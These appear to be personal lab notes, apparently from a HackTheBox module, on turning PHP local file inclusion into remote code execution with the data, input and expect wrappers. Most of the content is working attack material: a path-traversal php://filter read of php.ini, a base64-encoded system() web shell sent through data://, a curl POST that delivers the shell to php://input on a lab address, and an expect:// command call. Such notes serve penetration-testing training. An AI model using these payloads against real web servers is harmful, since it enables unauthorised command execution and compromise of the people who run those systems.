### Data Wrapper
The [data](https://www.php.net/manual/en/wrappers.data.php) wrapper can be used to include external data, including PHP code. However, the data wrapper is only available to use if the (`allow_url_include`) setting is enabled in the PHP configurations

PHP configuration file found at (`/etc/php/X.Y/apache2/php.ini`) for **Apache**
PHP configuration file found at  (`/etc/php/X.Y/fpm/php.ini`) for Nginx

We try to read the config file using LFI like so
```bash
php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini
```

```bash
adot8@htb[/htb]$ echo 'W1BIUF0KCjs7Ozs7Ozs7O...SNIP' | base64 -d | grep allow_url_include

allow_url_include = On
```

With `allow_url_include` enabled, we can proceed with our `data` wrapper attack

```bash
echo '<?php system($_GET["cmd"]); ?>' | base64
```

```bash
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id
```

### Input Wrapper
Similar to the `data` wrapper, the [input](https://www.php.net/manual/en/wrappers.php.php) wrapper can be used to include external input and execute PHP code. The difference between it and the `data` wrapper is that we pass our input to the `input` wrapper as a POST request's data. So, the vulnerable parameter must accept POST requests for this attack to work. Finally, the `input` wrapper also depends on the `allow_url_include` setting, as mentioned earlier

```bash
curl -s -X POST --data '<?php system($_REQUEST["cmd"]); ?>' "http://94.237.56.156:53371/index.php?page==php://input&cmd=id" | grep uid
```

### Expect Wrapper
We may utilize the [expect](https://www.php.net/manual/en/wrappers.expect.php) wrapper, which allows us to directly run commands through URL streams. Expect works very similarly to the web shells we've used earlier, but don't need to provide a web shell, as **it is designed to execute commands**.

`extension=expect` must be present within the php config file

```bash
php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini
```

```bash
adot8@htb[/htb]$ echo 'W1BIUF0KCjs7Ozs7Ozs7O=' | base64 -d | grep expect
extension=expect
```

Exploit
```bash
curl -s "http://10.10.10.10/index.php?language=expect://id"
```